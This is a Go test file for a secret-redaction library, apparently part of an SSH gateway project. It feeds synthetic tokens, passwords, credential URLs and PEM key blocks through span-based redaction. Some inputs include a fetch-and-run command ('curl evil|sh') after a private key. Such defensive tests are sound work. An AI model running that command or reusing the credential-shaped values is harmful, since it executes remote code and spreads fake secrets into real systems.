package redact_test

import (
	"sort"
	"strings"
	"testing"

	"github.com/karthikeyan5/sshgate/src/redact"
	"github.com/karthikeyan5/sshgate/src/redact/rules"
)

func spanSalt() [32]byte {
	var salt [32]byte
	for i := range salt {
		salt[i] = byte(i + 7)
	}
	return salt
}

type spanCase struct {
	name string
	in   string
}

// spanCorpus copies the inputs of the existing redact corpora (those tests
// keep their own inline literals). Each group names its source test.
func spanCorpus(t *testing.T) []spanCase {
	t.Helper()
	var cases []spanCase
	add := func(source string, inputs ...string) {
		for _, in := range inputs {
			cases = append(cases, spanCase{name: source + "/" + itoa(len(cases)), in: in})
		}
	}

	// scrub_test.go: TestRedactStringScrubsCommandSecrets, TestRedactStringEdgeCases,
	// TestRedactStringDeterministic, TestRedactStringMysqlFlagGapXFAIL.
	add("scrub",
		`printf 'PASSWORD=hunter2secret'`,
		`export GITHUB_TOKEN=ghp_abcd1234efgh`,
		`curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9xxxxx'`,
		`PGPASSWORD=hunter2secret psql -h db -U admin -c 'select 1'`,
		`ls -la`,
		`df -h`,
		`env PWD=/home/user/project ls`,
		"",
		`mysql -psecretpassword -h db`,
	)

	// leak_test.go: TestAbortedPEMSpanIsScannedNotFlushedRaw.
	add("leak/aborted-pem", "log noise\n-----BEGIN FAKE-----\n"+
		"aws=AKIA"+strings.Repeat("Q", 16)+"\n"+
		"pat=ghp_"+strings.Repeat("a", 40)+"\n"+
		strings.Repeat("Z", 9*1024)+"\nstill-no-end\n")
	// TestUnterminatedPEMAtEOFIsRedacted.
	add("leak/unterminated-pem", "here is a key:\n-----BEGIN OPENSSH PRIVATE KEY-----\n"+
		strings.Repeat("b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAAB", 6)+"\n")
	// TestAssignmentShapeValuesRedacted.
	add("leak/assignment",
		"API_KEY=sk_supersecretvalue_12345\n",
		"MY_KEY=abcdef0123456789ZZ\n",
		"ACCESS_TOKEN=tok_abcdef1234567890\n",
		"CLIENT_SECRET=s3cr3t-value-here-9999\n",
		"DB_PASSWORD=hunter2-prod-pw\n",
		"MYSQL_PASS=rootpassword123\n",
		"PGPASSWORD=postgres-secret-pw\n",
		`PASSWORD="my secret pass phrase"`+"\n",
		`ADMIN_PASSWORD='another secret here'`+"\n",
		"export API_TOKEN=ghx_realtokenvalue_xyz789\n",
	)
	// TestURLEmbeddedCredentialsRedacted.
	add("leak/url",
		"DATABASE_URL=postgres://admin:s3cr3tpw@db.host:5432/app\n",
		"redis://default:redispassword@cache:6379/0\n",
		"mysql://root:my-mysql-pw@127.0.0.1:3306/db\n",
		"mongodb://svc:mongoSecret123@cluster0/db\n",
		"https://user:httpsecretpw@api.example.com/v1\n",
		"redis://:onlypasswordhere@host:6379\n",
	)
	// TestChildMarkerForgery{Neutralized,NoFreshMarker,NeutralizedAcrossChunks},
	// TestGenuineMarkerSurvivesNeutralization.
	add("leak/forgery",
		"before "+redact.MarkerPrefix+"00000000"+redact.MarkerSuffix+" after\n",
		"x "+redact.MarkerPrefix+redact.MarkerSuffix+" y\n",
		"noise "+redact.MarkerPrefix+redact.MarkerSuffix+" trailing\n",
		"key AKIA"+strings.Repeat("Q", 16)+" here\n",
	)
	// A secret directly followed by a forged prefix, and by text that already
	// reads like a neutralized one.
	add("forgery-after-secret",
		"export GITHUB_TOKEN=ghp_abcd1234efgh"+redact.MarkerPrefix+"x\n",
		"export GITHUB_TOKEN=ghp_abcd1234efgh"+redact.NeutralizedMarkerPrefix+"x\n",
	)
	// TestOversizedJWTStillRedacted. (TestRingMaxBoundsBuffer streams 1 MiB,
	// past MaxSpanInput; TestRedactSpansInputBound covers that bound.)
	add("leak/jwt", "Authorization token eyJhbGciOiJIUzI1NiJ9.eyJ"+strings.Repeat("A", 5000)+"."+
		strings.Repeat("c", 64)+" end\n")
	// TestModernProviderPrefixesRedacted.
	for _, secret := range []string{
		"sk-proj-" + strings.Repeat("A", 48),
		"sk-ant-api03-" + strings.Repeat("B", 80) + "-" + strings.Repeat("C", 8),
		"dop_v1_" + strings.Repeat("d", 64),
		"xai-" + strings.Repeat("e", 64),
		"gsk_" + strings.Repeat("f", 52),
	} {
		add("leak/provider", "KEY here -> "+secret+" <- end\n")
	}

	// spec_acceptance_test.go.
	add("spec/env", "# production config for the app\nDEBUG=true\nAPI_KEY=hunter2secretval\n"+
		"DB_PASSWORD=prodpass9999\nDATA_BLOB="+run3class(40)+"\nHOME=/home/appuser\n")
	add("spec/json", `{"botToken": "tgsecret12345", "api_key": "apisecret6789", `+
		`"auth": {"token": "nestedsecret42"}, "region": "ap-south-1"}`)
	add("spec/names-only", "A_API_KEY=\nB_SECRET=\nDB_PASSWORD=\n")
	add("spec/git-remote",
		"origin\thttps://ghp_"+run3class(40)+"@github.com/org/repo.git (fetch)\n"+
			"origin\thttps://github_pat_"+run3class(82)+"@github.com/org/repo.git (push)\n",
		"origin\thttps://x-access-token:github_pat_"+run3class(82)+"@github.com/org/repo.git (fetch)\n",
	)
	line1, _ := sshEd25519Line(t)
	line2, _ := sshEd25519Line(t)
	add("spec/ssh-keys",
		line1+"\n",
		line1+"\n"+line2+"\n",
		"[github.com]:22 "+line1+"\n"+"example.com "+line2+"\n",
	)
	add("spec/bearer",
		"authorization: Bearer AAAAAAAAAAAAAAAAAAAAAM"+run3class(80)+"\n",
		"ssh-rsa AAAAAAAAAAAAAAAAAAAAAM"+run3class(80)+" attacker@evil\n",
	)
	for _, token := range []string{
		mkTelegramToken(),
		"sk-" + run3class(40),
		"github_pat_" + run3class(82),
		"1000." + hexRun(32) + "." + hexRun(32),
	} {
		add("spec/bare-token", "value is "+token+" end\n")
	}

	// pem_test.go.
	key := string(pemKey(t))
	cert := string(selfSignedCertPEM(t))
	add("pem/private",
		"prefix-line\n"+key+"suffix-line\n",
		"warmup\n"+key+"tail\n",
	)
	add("pem/public",
		"prefix-line\n"+cert+"suffix-line\n",
		string(publicKeyPEM(t)),
		string(csrPEM(t)),
		"warmup\n"+cert+"tail\n",
		strings.Replace(cert, "-----\n", "-----\nX-Secret: AKIA"+strings.Repeat("Q", 16)+"\n", 1),
	)
	for _, typ := range []string{"RSA PUBLIC KEY", "DH PARAMETERS", "EC PARAMETERS"} {
		add("pem/params", synthPEM(typ, run3class(120)))
	}
	for _, typ := range []string{"RSA PRIVATE KEY", "EC PRIVATE KEY", "DSA PRIVATE KEY", "OPENSSH PRIVATE KEY",
		"ENCRYPTED PRIVATE KEY", "PGP PRIVATE KEY BLOCK", "PRIVATE KEY"} {
		add("pem/private-variant", "before\n"+synthPEM(typ, run3class(120))+"after\n")
	}
	for _, typ := range []string{"WEIRD SECRET BLOB", "PROPRIETARY KEY MATERIAL", "MYSTERY"} {
		add("pem/unknown-label", synthPEM(typ, run3class(120)))
	}
	add("pem/aborted", "noise\n-----BEGIN FAKE STUFF-----\n"+strings.Repeat("Z", 9*1024)+"\nstill-no-end-marker\n")
	add("pem/end-without-begin", "orphan -----END PRIVATE KEY----- in the middle of logs\n")

	// Spans longer than the marker key's 8 KiB input.
	add("long",
		"Authorization token eyJhbGciOiJIUzI1NiJ9.eyJ"+strings.Repeat("A", 9000)+"."+strings.Repeat("c", 64)+" end\n",
		"x\n-----BEGIN RSA PRIVATE KEY-----\n"+strings.Repeat("Z", 9*1024)+"\ntail\n",
	)
	return cases
}

// assertSpansReproduce checks res against RedactString and splices the spans
// back: the redacted output must be exactly the gaps between spans (literal
// marker prefixes neutralized) and FormatMarker of each span's input bytes.
func assertSpansReproduce(t *testing.T, s string, salt [32]byte, ruleset []redact.Rule, res redact.SpanResult) {
	t.Helper()
	want, ok := redact.RedactString(s, salt, ruleset)
	if !ok || res.Redacted != want {
		t.Fatalf("Redacted = %q, want RedactString = %q (ok=%v)", res.Redacted, want, ok)
	}
	neutralize := func(gap string) string {
		return strings.ReplaceAll(gap, redact.MarkerPrefix, redact.NeutralizedMarkerPrefix)
	}
	rest := res.Redacted
	previousEnd, hidden := 0, 0
	for _, span := range res.Spans {
		if span.Start < previousEnd || span.End <= span.Start || span.End > len(s) {
			t.Fatalf("span %+v out of order or bounds (previous end %d, len %d)", span, previousEnd, len(s))
		}
		if !sort.StringsAreSorted(span.RuleIDs) {
			t.Errorf("span %+v: rule IDs not sorted", span)
		}
		for i := 1; i < len(span.RuleIDs); i++ {
			if span.RuleIDs[i] == span.RuleIDs[i-1] {
				t.Errorf("span %+v: duplicate rule ID", span)
			}
		}
		piece := neutralize(s[previousEnd:span.Start]) + redact.FormatMarker(salt, []byte(s[span.Start:span.End]))
		if !strings.HasPrefix(rest, piece) {
			t.Fatalf("span %+v does not splice back: output %q, want prefix %q", span, rest, piece)
		}
		rest = rest[len(piece):]
		hidden += span.End - span.Start
		previousEnd = span.End
	}
	if rest != neutralize(s[previousEnd:]) {
		t.Fatalf("tail after last span: output %q, want %q", rest, neutralize(s[previousEnd:]))
	}
	if res.HiddenBytes != hidden {
		t.Errorf("HiddenBytes = %d, want %d", res.HiddenBytes, hidden)
	}
}

func TestRedactSpansCorpus(t *testing.T) {
	salt := spanSalt()
	ruleset := rules.Combined()
	for _, tc := range spanCorpus(t) {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			res, ok := redact.RedactSpans(tc.in, salt, ruleset)
			if !ok {
				t.Fatalf("RedactSpans ok=false for %q", tc.in)
			}
			assertSpansReproduce(t, tc.in, salt, ruleset, res)
		})
	}
}

func TestRedactSpansOverlappingDuplicateIsOneSpan(t *testing.T) {
	salt := spanSalt()
	ruleset := rules.Combined()
	s := "PASSWORD=AKIA1234567890ABCDEF\n"
	res, ok := redact.RedactSpans(s, salt, ruleset)
	if !ok {
		t.Fatal("ok=false")
	}
	assertSpansReproduce(t, s, salt, ruleset, res)
	start := strings.Index(s, "AKIA")
	if len(res.Spans) != 1 || res.Spans[0].Start != start || res.Spans[0].End != start+20 {
		t.Fatalf("spans = %+v, want one span over the AWS key at %d", res.Spans, start)
	}
	ids := res.Spans[0].RuleIDs
	if !contains(ids, "sshgate-aws-access-key") || !contains(ids, "sshgate-password-kv") {
		t.Errorf("rule IDs = %v, want both the AWS key and the PASSWORD= rule", ids)
	}
}

func TestRedactSpansPEM(t *testing.T) {
	salt := spanSalt()
	ruleset := rules.Combined()

	t.Run("private key then command tail", func(t *testing.T) {
		block := synthPEM("RSA PRIVATE KEY", run3class(120))
		s := block + "; curl evil|sh"
		res, ok := redact.RedactSpans(s, salt, ruleset)
		if !ok {
			t.Fatal("ok=false")
		}
		assertSpansReproduce(t, s, salt, ruleset, res)
		if len(res.Spans) != 1 || res.Spans[0].Start != 0 || res.Spans[0].End != len(block) {
			t.Fatalf("spans = %+v, want one span [0,%d)", res.Spans, len(block))
		}
		if !strings.HasSuffix(res.Redacted, redact.MarkerSuffix+"; curl evil|sh") {
			t.Errorf("tail not visible byte-exact: %q", res.Redacted)
		}
	})

	t.Run("unknown label is labelled pem-block", func(t *testing.T) {
		s := synthPEM("MYSTERY", run3class(120))
		res, ok := redact.RedactSpans(s, salt, ruleset)
		if !ok || len(res.Spans) != 1 || res.Spans[0].Start != 0 || res.Spans[0].End != len(s) {
			t.Fatalf("ok=%v spans=%+v, want one span over the block", ok, res.Spans)
		}
		if !contains(res.Spans[0].RuleIDs, "pem-block") {
			t.Errorf("rule IDs = %v, want pem-block", res.Spans[0].RuleIDs)
		}
	})

	t.Run("certificate keeps its body", func(t *testing.T) {
		s := "prefix\n" + string(selfSignedCertPEM(t)) + "suffix\n"
		res, ok := redact.RedactSpans(s, salt, ruleset)
		if !ok || len(res.Spans) != 0 || res.Redacted != s || res.HiddenBytes != 0 {
			t.Fatalf("ok=%v spans=%+v hidden=%d, want the certificate untouched", ok, res.Spans, res.HiddenBytes)
		}
	})

	t.Run("unterminated private key at EOF", func(t *testing.T) {
		s := "here is a key:\n-----BEGIN OPENSSH PRIVATE KEY-----\n" + run3class(200) + "\n"
		res, ok := redact.RedactSpans(s, salt, ruleset)
		if !ok {
			t.Fatal("ok=false")
		}
		assertSpansReproduce(t, s, salt, ruleset, res)
		begin := strings.Index(s, "-----BEGIN")
		if len(res.Spans) != 1 || res.Spans[0].Start != begin || res.Spans[0].End != len(s) {
			t.Fatalf("spans = %+v, want one span [%d,%d)", res.Spans, begin, len(s))
		}
	})

	t.Run("aborted BEGIN", func(t *testing.T) {
		s := "noise\n-----BEGIN FAKE-----\naws=AKIA1234567890ABCDEF\n" + strings.Repeat("Z", 9*1024) + "\nend\n"
		res, ok := redact.RedactSpans(s, salt, ruleset)
		if !ok {
			t.Fatal("ok=false")
		}
		assertSpansReproduce(t, s, salt, ruleset, res)
		start := strings.Index(s, "AKIA")
		if len(res.Spans) != 1 || res.Spans[0].Start != start || res.Spans[0].End != start+20 {
			t.Fatalf("spans = %+v, want only the AWS key", res.Spans)
		}
	})
}

func TestRedactSpansUnionMergeStitch(t *testing.T) {
	salt := spanSalt()
	ruleset := rules.Combined()
	// From TestStitchBodyNotLeakedWhenDedupedAway: a generic run whose digit
	// tail is peeled as a telegram bot id; dedupMatches unions the two.
	token := run3class(30) + "123456:AA" + mkTelegramToken()[len("0123456789:AA"):]
	s := "v=" + token + " end\n"
	res, ok := redact.RedactSpans(s, salt, ruleset)
	if !ok {
		t.Fatal("ok=false")
	}
	assertSpansReproduce(t, s, salt, ruleset, res)
	if len(res.Spans) != 1 || res.Spans[0].Start != 2 || res.Spans[0].End != 2+len(token) {
		t.Fatalf("spans = %+v, want one span over the whole token [2,%d)", res.Spans, 2+len(token))
	}
	ids := res.Spans[0].RuleIDs
	if !contains(ids, "sshgate-generic-high-entropy") || !contains(ids, "sshgate-telegram-bot-token") {
		t.Errorf("rule IDs = %v, want both merged rules", ids)
	}
}

func TestRedactSpansForgeryIsNotASpan(t *testing.T) {
	if len(redact.MarkerPrefix) != len(redact.NeutralizedMarkerPrefix) {
		t.Fatal("span alignment assumes the neutralized prefix is as long as MarkerPrefix")
	}
	salt := spanSalt()
	ruleset := rules.Combined()
	s := "x " + redact.MarkerPrefix + redact.MarkerSuffix + " y\n"
	res, ok := redact.RedactSpans(s, salt, ruleset)
	if !ok {
		t.Fatal("ok=false")
	}
	assertSpansReproduce(t, s, salt, ruleset, res)
	if len(res.Spans) != 0 || res.HiddenBytes != 0 || !strings.Contains(res.Redacted, redact.NeutralizedMarkerPrefix) {
		t.Fatalf("spans=%+v hidden=%d redacted=%q, want a neutralized prefix and nothing hidden",
			res.Spans, res.HiddenBytes, res.Redacted)
	}
}

func TestRedactSpansNoRules(t *testing.T) {
	s := "export GITHUB_TOKEN=ghp_abcd1234efgh"
	for _, ruleset := range [][]redact.Rule{nil, {}} {
		res, ok := redact.RedactSpans(s, spanSalt(), ruleset)
		if !ok || res.Redacted != s || res.Spans != nil || res.HiddenBytes != 0 {
			t.Errorf("rules=%v: got (%+v, %v), want identity", ruleset, res, ok)
		}
	}
}

func TestRedactSpansInputBound(t *testing.T) {
	salt := spanSalt()
	ruleset := rules.Combined()
	secrets := "export GITHUB_TOKEN=ghp_abcd1234efgh\n"
	benign := strings.Repeat("drwxr-xr-x 2 root root 4096 Oct 15 06:52 /var/log/journal\n", 500)
	atBound := benign + secrets + benign + secrets
	atBound += strings.Repeat("x", redact.MaxSpanInput-len(atBound))
	res, ok := redact.RedactSpans(atBound, salt, ruleset)
	if !ok {
		t.Fatal("input of exactly MaxSpanInput: ok=false")
	}
	assertSpansReproduce(t, atBound, salt, ruleset, res)
	if len(res.Spans) != 2 {
		t.Errorf("spans = %+v, want the two tokens", res.Spans)
	}
	if _, ok := redact.RedactSpans(atBound+"x", salt, ruleset); ok {
		t.Error("input of MaxSpanInput+1: ok=true, want false")
	}
}

// TestRedactSpansWorkBudgetFailsClosed: 800 equal secrets, each followed by
// the same text, give every marker hundreds of literal-compatible ends to
// rule out; the search stops at its budget and refuses.
func TestRedactSpansWorkBudgetFailsClosed(t *testing.T) {
	s := strings.Repeat("API_KEY=hunter2secretval and some text\n", 800)
	if res, ok := redact.RedactSpans(s, spanSalt(), rules.Combined()); ok {
		t.Fatalf("ok=true with %d spans, want the budget to refuse", len(res.Spans))
	}
}

// TestRedactSpansAmbiguousFailsClosed drives the real Writer into two adjacent
// markers with equal keys: `A+X` hides A*8192+"X" and `A+` the A*9000 after it.
// Both keys cover only their span's first 8 KiB, which is all 'A', so ending
// the first span anywhere in [8193, 9001] aligns equally well.
func TestRedactSpansAmbiguousFailsClosed(t *testing.T) {
	salt := spanSalt()
	ruleset := []redact.Rule{
		redact.CompileRule("test-a-run-x", "A run ending in X", `A+X`, []string{"X"}, 0, 0, 0),
		redact.CompileRule("test-a-run", "A run", `A+`, []string{"A"}, 0, 0, 0),
	}
	s := strings.Repeat("A", 8192) + "X" + strings.Repeat("A", 9000)
	out, ok := redact.RedactString(s, salt, ruleset)
	marker := redact.FormatMarker(salt, []byte(strings.Repeat("A", 8192)))
	if !ok || out != marker+marker {
		t.Fatalf("precondition: RedactString = %q, want two equal adjacent markers", out)
	}
	if res, ok := redact.RedactSpans(s, salt, ruleset); ok {
		t.Fatalf("ambiguous alignment accepted: %+v", res.Spans)
	}

	// Control: a second run shorter than 8 KiB is keyed on all its bytes,
	// which pins the split.
	short := strings.Repeat("A", 8192) + "X" + strings.Repeat("A", 100)
	res, ok := redact.RedactSpans(short, salt, ruleset)
	if !ok || len(res.Spans) != 2 || res.Spans[0].End != 8193 {
		t.Fatalf("control: ok=%v spans=%+v, want [0,8193) and [8193,%d)", ok, res.Spans, len(short))
	}
	assertSpansReproduce(t, short, salt, ruleset, res)
}

func FuzzRedactSpans(f *testing.F) {
	for _, seed := range []string{
		"",
		"PASSWORD=AKIA1234567890ABCDEF\n",
		`export GITHUB_TOKEN=ghp_abcd1234efgh`,
		"before " + redact.MarkerPrefix + "00000000" + redact.MarkerSuffix + " after\n",
		"x " + redact.NeutralizedMarkerPrefix + " y " + redact.MarkerPrefix,
		synthPEM("RSA PRIVATE KEY", run3class(120)) + "; curl evil|sh",
		synthPEM("CERTIFICATE", run3class(120)),
		"v=" + run3class(30) + "123456:AA" + mkTelegramToken()[len("0123456789:AA"):] + " end\n",
		"value is " + mkTelegramToken() + " end\n",
		"API_KEY=hunter2secretval DB_PASSWORD=prodpass9999 DATA_BLOB=" + run3class(40),
	} {
		f.Add(seed)
	}
	salt := spanSalt()
	ruleset := rules.Combined()
	f.Fuzz(func(t *testing.T, s string) {
		res, ok := redact.RedactSpans(s, salt, ruleset)
		if !ok {
			// Commands are at most 4 KiB; a refusal there would make a real
			// request unrenderable, so it is a finding, not a pass.
			if len(s) <= 4096 {
				t.Fatalf("ok=false for a %d-byte input %q", len(s), s)
			}
			return
		}
		assertSpansReproduce(t, s, salt, ruleset, res)
	})
}

func contains(list []string, want string) bool {
	for _, item := range list {
		if item == want {
			return true
		}
	}
	return false
}
